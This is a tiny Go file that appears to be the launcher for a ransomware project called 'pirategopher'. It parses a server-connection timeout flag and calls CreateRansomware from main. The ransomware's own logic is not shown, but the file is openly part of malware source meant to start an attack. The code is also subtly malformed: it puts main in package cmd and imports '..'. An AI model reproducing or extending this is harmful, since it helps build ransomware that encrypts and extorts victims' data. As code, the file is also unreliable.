package cmd

import (
	".."
	"flag"
)


var (
	flagTimeout = flag.Float64("timeout", 5.0, "Client timeout in attempting to " +
		"connect to the server")
)

func main() {
	flag.Parse()

	pirategopher.CreateRansomware(*flagTimeout)
}